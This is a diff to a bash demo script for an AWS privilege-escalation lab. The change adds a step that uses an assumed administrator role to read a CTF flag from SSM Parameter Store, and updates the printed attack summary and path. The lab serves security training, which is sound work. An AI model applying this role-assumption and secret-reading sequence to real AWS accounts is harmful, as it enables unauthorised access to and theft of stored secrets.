@@ -178,16 +178,36 @@ else
 fi
 echo ""
 
-# Summary
-echo -e "${GREEN}========================================${NC}"
-echo -e "${GREEN}Attack Summary${NC}"
-echo -e "${GREEN}========================================${NC}"
-echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
-echo -e "Step 1: Used ${YELLOW}sts:AssumeRole${NC} to directly assume admin role"
-echo -e "Result: ${GREEN}Administrator Access${NC}"
+# [EXPLOIT] Step 7: Capture the CTF flag
+# The assumed role has AdministratorAccess, which grants ssm:GetParameter implicitly.
+# Use the current session credentials (assumed role) to read the scenario flag.
+echo -e "${YELLOW}Step 7: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/sts-001-to-admin"
+show_attack_cmd "Attacker (assumed role)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
 echo ""
-echo -e "${YELLOW}Attack Path:${NC}"
-echo -e "  $STARTING_USER → (AssumeRole) → $ADMIN_ROLE_NAME → Admin"
+
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
+echo -e "\n${GREEN}========================================${NC}"
+echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "\n${YELLOW}Attack Summary:${NC}"
+echo "1. Started as: $STARTING_USER (limited permissions)"
+echo "2. Used sts:AssumeRole to directly assume admin role: $ADMIN_ROLE_NAME"
+echo "3. Achieved: Administrator Access"
+echo "4. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
+
+echo -e "\n${YELLOW}Attack Path:${NC}"
+echo -e "  $STARTING_USER → (sts:AssumeRole) → $ADMIN_ROLE_NAME → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
@@ -197,12 +217,8 @@ if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
 fi
 
 echo ""
-echo -e "${GREEN}Privilege escalation successful!${NC}"
 echo -e "${YELLOW}This scenario demonstrates direct role assumption for privilege escalation.${NC}"
 echo -e "${YELLOW}No cleanup needed - this attack makes no persistent changes.${NC}\n"
-
-# Restore helpful permissions for manual exploration
-restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Mark demo as active for plabs tracking
 touch "$(dirname "$0")/.demo_active"
